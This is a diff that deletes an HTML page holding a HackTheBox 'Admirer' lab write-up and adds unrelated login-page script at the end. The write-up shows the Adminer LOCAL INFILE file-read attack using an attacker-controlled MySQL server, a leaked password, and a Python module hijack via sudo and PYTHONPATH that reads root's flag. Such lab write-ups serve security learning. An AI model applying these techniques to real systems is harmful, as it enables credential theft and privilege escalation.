-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#48b685">   if (</span><span style="color:#f99b15">$conn-&gt;connect_error</span><span style="color:#48b685">) {
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#48b685">       die(&#34;</span><span style="color:#06b6ef">Connection</span> <span style="color:#06b6ef">failed</span><span style="color:#5bc4bf">:</span> <span style="color:#48b685">&#34; . </span><span style="color:#f99b15">$conn-&gt;connect_error</span><span style="color:#48b685">);
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#48b685">   }
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#48b685">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#48b685">   </span><span style="color:#f99b15">$sql</span><span style="color:#48b685"> = &#34;</span><span style="color:#06b6ef">SELECT</span> <span style="color:#5bc4bf">*</span> <span style="color:#06b6ef">FROM</span> <span style="color:#06b6ef">items</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#48b685">   </span><span style="color:#f99b15">$result</span><span style="color:#48b685"> = </span><span style="color:#f99b15">$conn-&gt;query</span><span style="color:#48b685">(</span><span style="color:#f99b15">$sql</span><span style="color:#48b685">);
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span style="color:#48b685">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span style="color:#48b685">   if (</span><span style="color:#f99b15">$result-&gt;num_rows</span><span style="color:#48b685"> &gt; 0) {
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span style="color:#48b685">       // output data of each row
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span style="color:#48b685">       while(</span><span style="color:#f99b15">$row</span><span style="color:#48b685"> = </span><span style="color:#f99b15">$result-&gt;fetch_assoc</span><span style="color:#48b685">()) {
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">article</span> <span style="color:#06b6ef">class</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;thumb&#39;</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">a</span> <span style="color:#06b6ef">href</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;&#34;.$row[&#34;image_path&#34;].&#34;&#39;</span> <span style="color:#06b6ef">class</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;image&#39;</span><span style="color:#5bc4bf">&gt;&lt;/</span><span style="color:#06b6ef">img</span> <span style="color:#06b6ef">src</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;&#34;.$row[&#34;thumb_path&#34;].&#34;&#39;</span> <span style="color:#06b6ef">alt</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;&#39;</span> <span style="color:#5bc4bf">/&gt;&lt;/</span><span style="color:#06b6ef">a</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">h2</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;.</span><span style="color:#f99b15">$row[&#34;title&#34;]</span><span style="color:#48b685">.&#34;</span><span style="color:#5bc4bf">&lt;/</span><span style="color:#06b6ef">h2</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">p</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;.</span><span style="color:#f99b15">$row[&#34;text&#34;]</span><span style="color:#48b685">.&#34;</span><span style="color:#5bc4bf">&lt;/</span><span style="color:#06b6ef">p</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;/</span><span style="color:#06b6ef">article</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span style="color:#48b685">       }
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span style="color:#48b685">    } 
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span style="color:#48b685">    else {
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span style="color:#48b685">             echo &#34;</span><span style="color:#f99b15">0</span> <span style="color:#06b6ef">results</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span style="color:#48b685">         }
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span style="color:#48b685">    </span><span style="color:#f99b15">$conn-&gt;close</span><span style="color:#48b685">();
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span style="color:#48b685">?&gt;
-</span></code></pre></div><h2 id="privilege-escalation--user">Privilege escalation : User</h2>
-<hr>
-<h3 id="database-management-tool-adminer">Database management tool: Adminer</h3>
-<hr>
-<p>Resembling the box name, adminer is a database management tool like phpmyadmin
-that lets manage the database through a browser. The default login page URI of
-adminer is adminer.php. We find login page in the /utility-scripts directory.
-The name of the database id <strong>admirerdb</strong> found from the file dump.sql</p>
-<p><img src="/img/htb_admirer/9.png" alt=""></p>
-<p>We try logging in with the different creds we found previously but none works.</p>
-<p>We search for adminer vulnerabilities and find one at
-(<a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a>)</p>
-<h3 id="adminer-exploit">Adminer Exploit</h3>
-<hr>
-<p>We follow the instructions:</p>
-<ol>
-<li>We connect to mysql server running on our local machine from the adminer
-page. For this, we set up a user and a database for connection from remote
-sources. We follow the steps as follows:</li>
-</ol>
-<ul>
-<li>Create a new database and add a new user with password and grant privileges
-to the created database. NExt we add a new table &lsquo;test&rsquo; to the database</li>
-</ul>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#815ba4">CREATE</span> <span style="color:#815ba4">DATABASE</span> <span style="color:#48b685">&#39;htb_admirer&#39;</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#815ba4">CREATE</span> <span style="color:#815ba4">USER</span> admirer<span style="color:#5bc4bf">@</span><span style="color:#f99b15">10</span>.<span style="color:#f99b15">10</span>.<span style="color:#f99b15">14</span>.<span style="color:#f99b15">2</span> <span style="color:#815ba4">IDENTIFIED</span> <span style="color:#815ba4">BY</span> <span style="color:#48b685">&#39;admirer&#39;</span>;   
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#815ba4">GRANT</span> <span style="color:#815ba4">ALL</span> <span style="color:#815ba4">PRIVILEGES</span> <span style="color:#815ba4">ON</span> htb_admirer.<span style="color:#5bc4bf">*</span> <span style="color:#815ba4">TO</span> admirer<span style="color:#5bc4bf">@</span><span style="color:#f99b15">10</span>.<span style="color:#f99b15">10</span>.<span style="color:#f99b15">14</span>.<span style="color:#f99b15">2</span> <span style="color:#815ba4">WITH</span> <span style="color:#815ba4">GRANT</span> <span style="color:#815ba4">OPTION</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#815ba4">CREATE</span> <span style="color:#815ba4">USER</span> admirer<span style="color:#5bc4bf">@</span><span style="color:#48b685">&#39;%&#39;</span> <span style="color:#815ba4">IDENTIFIED</span> <span style="color:#815ba4">BY</span> <span style="color:#48b685">&#39;admirer&#39;</span>;   
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#815ba4">GRANT</span> <span style="color:#815ba4">ALL</span> <span style="color:#815ba4">PRIVILEGES</span> <span style="color:#815ba4">ON</span> htb_admirer.<span style="color:#5bc4bf">*</span> <span style="color:#815ba4">TO</span> admirer<span style="color:#5bc4bf">@</span><span style="color:#48b685">&#39;%&#39;</span> <span style="color:#815ba4">WITH</span> <span style="color:#815ba4">GRANT</span> <span style="color:#815ba4">OPTION</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#815ba4">FLUSH</span> <span style="color:#815ba4">PRIVILEGES</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#815ba4">use</span> htb_admirer;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#815ba4">CREATE</span> <span style="color:#815ba4">TABLE</span> <span style="color:#06b6ef">test</span>( 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>  <span style="color:#5bc4bf">&gt;</span> name  <span style="color:#fec418">VARCHAR</span>(<span style="color:#f99b15">255</span>),
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>  <span style="color:#5bc4bf">&gt;</span> color <span style="color:#fec418">CHAR</span>(<span style="color:#f99b15">7</span>),
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>  <span style="color:#5bc4bf">&gt;</span> <span style="color:#815ba4">PRIMARY</span> <span style="color:#815ba4">KEY</span> (name) 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>);
-</code></pre></div><ul>
-<li>Change the bind address in your file /etc/mysql/mariadb.conf.d/50-server.cnf
-from default 127.0.0.1 to 0.0.0.0 for allowing remote connections to mysql
-server. Note that this is not secure and should be changed after the work is
-done.</li>
-</ul>
-<ol start="2">
-<li>
-<p>We connect to our mysql server with the necessary creds from adminer:</p>
-<p><img src="/img/htb_admirer/11.png" alt=""></p>
-</li>
-<li>
-<p>Going into the sql command, we put in our required command and execute.
-Since the adminer.php file in in the utility-scripts directory, we can use
-../index.php to read the local index.php file which should contain the db creds
-for user waldo, which we ound in the backup but with a typo:</p>
-</li>
-</ol>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#815ba4">LOAD</span> DATA LOCAL <span style="color:#815ba4">INFILE</span> <span style="color:#48b685">&#39;var/lib/mysql/mysql/local.xml&#39;</span> 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span style="color:#815ba4">INTO</span> <span style="color:#815ba4">TABLE</span> htb_admirer.test
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>FIELDS <span style="color:#815ba4">TERMINATED</span> <span style="color:#815ba4">BY</span> <span style="color:#48b685">&#34;\n&#34;</span>
-</code></pre></div><p><img src="/img/htb_admirer/12.png" alt=""></p>
-<ol start="4">
-<li>We read the data inserted to our table from the local file index.php.</li>
-</ol>
-<p><img src="/img/htb_admirer/13.png" alt=""></p>
-<p>We get the correct creds for user waldo now.
-$password = &ldquo;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&rdquo;;</p>
-<p>Now, we use the found creds to login into adminer as waldo</p>
-<p><img src="/img/htb_admirer/14.png" alt=""></p>
-<p><img src="/img/htb_admirer/15.png" alt=""></p>
-<p><img src="/img/htb_admirer/16.png" alt=""></p>
-<p>We see that we can see the images.</p>
-<p>Since many users use the same password in many places, we try the password for
-waldo to get ssh access and we succeed</p>
-<p><img src="/img/htb_admirer/17.png" alt=""></p>
-<h2 id="privilege-escalation--root">Privilege escalation : root</h2>
-<hr>
-<h3 id="enumeration">Enumeration</h3>
-<hr>
-<p>Running sudo -l with waldo&rsquo;s password shows that we can run /opt/scripts/admin_scripts.sh as root.</p>
-<p><img src="/img/htb_admirer/18.png" alt=""></p>
-<p>Running the script, we can backup the /etc/shadow file but it is only readable by root.
-We try to hijack the path &ldquo;echo&rdquo; is called from in the script by changing the
-path to our directory /tmp/fm and creating a py file named &ldquo;echo&rdquo; there. But it
-fails since we see that in sudo -l command output, there is a secure path,
-which sets the path for sudo commands. So, path hijacking will not work.</p>
-<p>After lookin around for a while, we find that we can hijack the python path for
-the module shutil which is imported in the file backup.py, which is run in the
-script admin_tasks.sh in the task 6-backup web. This looks like a promising
-attack vector.</p>
-<p><img src="/img/htb_admirer/20.png" alt=""></p>
-<p><img src="/img/htb_admirer/21.png" alt=""></p>
-<h3 id="python-path-hijack">Python path hijack</h3>
-<hr>
-<p>You can read up on this
-<a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=3&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiuwdyNgJ_pAhX9xjgGHd_2A0kQFjACegQIBBAB&amp;url=https%3A%2F%2Fmedium.com%2F%40klockw3rk%2Fprivilege-escalation-hijacking-python-library-2a0e92a45ca7&amp;usg=AOvVaw3-QulW0rZZnpDyQbOp2xNV">here</a></p>
-<p>We create a directory <code>/tmp/fm</code> and write a python script in the name of the module <code>shutil.py</code> containing the function <code>make_archive(a,b,c)</code>
-which will run out desired code, in this case cat ing out the root.txt to a file named hello in the directory /tmp/fm:</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">os</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">make_archive</span>(a,b,c):
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>        os<span style="color:#5bc4bf">.</span>system(<span style="color:#48b685">&#34;cat /root/root.txt &gt; /tmp/fm/hello&#34;</span>)
-</code></pre></div><p>Now we have to make python look for the module in our directory first instead
-of <code>/usr/lib/python3.5</code>.</p>
-<p>We trying exporting the path using <code>export PYTHONPATH=/tmp/fm</code>. But this
-path is not read while running sudo. You can read up on PYTHONPATH
-<a href="https://www.tutorialspoint.com/What-is-PYTHONPATH-environment-variable-in-Python">here</a></p>
-<p>After looking for a bit, we find that we can pass environment variables
-directly in the sudo command like <code>sudo VARIABLE=VALUE COMMAND</code>.</p>
-<p>This was completely new to me. I found this
-<a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwjV-fSV_p7pAhXRyzgGHRQTBqIQFjAAegQIAhAB&amp;url=https%3A%2F%2Faskubuntu.com%2Fquestions%2F57915%2Fenvironment-variables-when-run-with-sudo&amp;usg=AOvVaw19NVFoRV8gSxsfZPFAjdyB">here</a>.</p>
-<p>So, we run the following commands to get our root.txt</p>
-<p><img src="/img/htb_admirer/19.png" alt=""></p>
-
-    </div>
-    <div class="article-footer">
-<blockquote class="mt-2x">
-  <ul class="post-copyright list-unstyled">
-    <li class="post-copyright-link hidden-xs">
-      <strong>Permalink: </strong>
-      <a href="/writeups/hackthebox-writeups/hackthebox-admirer-writeup/" title="Hackthebox - Admirer Writeup" target="_blank" rel="external">/writeups/hackthebox-writeups/hackthebox-admirer-writeup/</a>
-    </li>
-    <li class="post-copyright-license">
-      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
-    </li>
-  </ul>
-</blockquote>
-
-<div class="panel panel-default panel-badger">
-  <div class="panel-body">
-    <figure class="media">
-      <div class="media-left">
-        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
-          <img src="/avatar.png" class="img-rounded w-full" alt="">
-        </a>
-      </div>
-      <div class="media-body">
-        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
-        <div>Hack the Planet</div>
-      </div>
-    </figure>
-  </div>
-</div>
-
-    </div>
-  </article>
-<section id="comments">
-</section>
-
-</div><nav class="bar bar-footer clearfix" data-stick-bottom>
-    <div class="bar-inner">
-        <ul class="pager pull-left">
-            <li class="prev">
-                <a href="/writeups/hackthebox-writeups/hackthebox-web-challenge-writeups/" title="Hackthebox[Web-Challenge] Writeups"><i
-                        class="icon icon-angle-left"
-                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
-            </li>
-            <li class="next">
-                <a href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/"
-                    title="TryHackMe - DogCat Writeup"><span>Newer&nbsp;&nbsp;</span><i
-                        class="icon icon-angle-right" aria-hidden="true"></i></a>
-            </li>
-            
-            <li class="toggle-toc">
-                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
-                    title="Catalogue" role="button">
-                    <span>[&nbsp;</span><span>Index</span>
-                    <i class="text-collapsed icon icon-anchor"></i>
-                    <i class="text-in icon icon-close"></i>
-                    <span>]</span>
-                </a>
-            </li>
-        </ul>
-        <div class="bar-right">
-            <div class="share-component" data-sites="facebook,twitter"
-                data-mobile-sites="">Share on:</div>
-        </div>
-    </div>
-</nav>
-
-
-
-</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
-<ul class="social-links">
-    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
-            <i class="icon icon-github"></i></a></li>
-    <li><a href="/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
-            <i class="icon icon-rss"></i></a></li>
-    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
-            <i class="icon icon-twitter"></i></a></li>
-</ul>
-  <div class="copyright">
-    &copy;2020  -
-    2020
-    
-    
-    </div>
-  </div>
-</footer>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-            showMathMenu: false, //disables context menu
-            tex2jax: {
-            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
-           }
-    });
-</script>
-
-
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
-<script>
-    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
-</script>
-<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
-    hljs.configure({
-        tabReplace: '    ', 
-        classPrefix: ''     
-        
-    })
-    hljs.initHighlightingOnLoad();
-</script>
-<script src="/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
-<script src="/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
-
-<script>
-    (function (window) {
-        var INSIGHT_CONFIG = {
-            TRANSLATION: {
-                CATEGORIES: 'Categories',
-                TAGS: 'Tags',
-            },
-            ROOT_URL: '\/',
-            CONTENT_URL: '\/\/searchindex.json ',
-        };
-        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-    })(window);
-</script>
-<script type="text/javascript" src="/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-<script>
-    tocbot.init({
-        
-        tocSelector: '.js-toc',
-        
-        contentSelector: '.js-toc-content',
-        
-        headingSelector: 'h1, h2, h3',
-        
-        hasInnerContainers: true,
-    });
-</script>
-
-
-
-  </body>
+            document.onkeydown = function (e) {
+                e = e || window.event
+                if (e.keyCode == 13) {
+                    login(password[0].value)
+                }
+            }
+        </script>
+    </body>
 </html>
